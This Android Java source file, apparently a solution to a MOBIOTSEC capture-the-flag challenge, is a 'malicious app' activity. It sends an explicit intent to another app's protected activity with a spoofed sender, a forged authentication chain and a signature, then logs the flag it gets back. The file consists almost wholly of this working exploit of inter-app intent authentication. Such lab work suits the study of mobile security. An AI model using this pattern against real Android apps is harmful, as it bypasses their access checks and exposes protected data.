package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity  {

    private static final String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.i(TAG, "onCreate");
    }

    @Override
    protected void onStart() {
        super.onStart();
        // String chain = "********";
        String chain = "A-to-B/B-to-C";

        Log.i(TAG, "onStart");

        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("com.mobiotsec.nojumpstarts", "com.mobiotsec.nojumpstarts.C"));

        intent1.putExtra("sender", "com.mobiotsec.nojumpstarts");

        intent1.putExtra("authmsg", chain);
        try {
            intent1.putExtra("authsign", Main.sign(chain));
        } catch (Exception e) {
            Log.i(TAG, Log.getStackTraceString(e));
        }
        if (intent1.resolveActivity(getPackageManager()) != null) {
            Log.i(TAG, "Sent malicious intent");
            startActivityForResult(intent1, 1);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.i(TAG, "key: " + requestCode + " " + data.getStringExtra("flag"));
    }
}